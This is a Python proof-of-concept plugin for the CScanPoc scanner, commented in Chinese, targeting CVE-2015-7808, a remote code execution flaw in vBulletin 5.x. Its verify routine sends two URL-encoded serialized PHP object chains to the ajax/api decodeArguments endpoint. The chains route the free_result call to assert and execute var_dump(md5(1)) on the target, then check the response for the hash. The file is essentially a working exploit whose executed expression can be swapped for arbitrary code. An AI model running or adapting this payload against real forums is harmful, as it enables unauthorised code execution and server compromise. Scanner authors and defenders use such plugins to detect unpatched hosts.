# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'vBulletin_0001'  # 平台漏洞编号，留空
    name = 'vBulletin 5.x.x ajax/api 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-11-05'  # 漏洞公布时间
    desc = '''
    vBulletin是美国Internet Brands和vBulletin Solutions公司共同开发的一款开源的商业Web论坛程序。
    vBulletin 程序在处理 Ajax API 调用的时候，使用 unserialize() 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-07254'  # 漏洞来源
    cnvd_id = 'CNVD-2015-07254'  # cnvd漏洞编号
    cve_id = 'CVE-2015-7808 '  # cve编号
    product = 'vBulletin'  # 漏洞应用名称
    product_version = 'vBulletin 5.x.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd7566e5e-b797-49aa-bc0b-7c3694ed2fbc'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [("/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result"
                         "%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database"
                         "%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22"
                         "free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00"
                         "%2A%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D"),
                        ("/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result"
                         "%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_My"
                         "SQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22"
                         "free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A"
                         "%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D")]
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)
                if 'c4ca4238a0b923820dcc509a6f75849' in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
